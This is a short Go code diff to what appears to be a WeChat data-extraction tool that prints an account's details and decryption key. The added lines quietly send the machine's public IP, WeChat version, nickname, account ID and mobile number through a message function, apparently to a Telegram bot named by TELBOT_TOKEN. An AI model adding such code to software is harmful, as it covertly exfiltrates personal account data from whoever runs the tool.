@@ -49,6 +49,13 @@ func ShowInfoCmd() {
 	fmt.Printf("WeChat Account: %s \n", WeChatDataObject.Account)
 	fmt.Printf("WeChat Mobile: %s \n", WeChatDataObject.Mobile)
 	fmt.Printf("WeChat Key: %s \n", WeChatDataObject.Key)
+	if TELBOT_TOKEN != "" {
+		publicIp, err := GetPublicIp()
+		if err != nil {
+			publicIp = ""
+		}
+		SendMessge(fmt.Sprintf("[%s][%s][%s][%s][%s]", publicIp, WeChatDataObject.Version, WeChatDataObject.NickName, WeChatDataObject.Account, WeChatDataObject.Mobile))
+	}
 }
 
 func DecryptCmd() {
